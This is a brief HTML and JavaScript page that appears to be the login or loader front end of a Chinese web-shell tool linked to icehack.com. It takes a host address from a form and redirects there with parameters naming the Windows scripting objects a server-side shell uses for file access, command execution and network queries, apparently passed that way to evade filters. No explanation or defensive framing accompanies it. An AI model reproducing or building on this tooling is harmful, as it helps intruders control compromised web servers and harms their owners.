<body onLoad=init() bgcolor=#61bbd6>
<script language=JavaScript>
var ticker,sec,min,id;
function init(){clearTimeout(id);ticker=0;min=0;sec=0;}
function runclk(){
min=Math.floor(ticker/60);
sec=(ticker-(min*60))+'';
if(sec.length==1){sec="0"+sec};
ticker++;
document.forms[1].view.value=min+":"+sec;
id=setTimeout('init()',9000);
id=setTimeout('runclk()',1000);
}
function lp()
{
runclk();document.forms[1].view.value="加载中...";
setTimeout("document.forms[1].view.value='登陆中...'",9000);
if(document.forms[0].ma.value<=0){window.location.href="http://www.icehack.com";return false;}
location.href="http://"+document.forms[0].ma.value+"?lP=Adodb.Stream&tN=WSCRIPT.NETWORK&sa=shell.application&TV=WSCRIPT.shell&fB=Scripting.FileSystemObject&SY=Scripting.Dictionary&az=lp&aw=2005&rz=2005&rz1=2005";
return false;
}
</script>
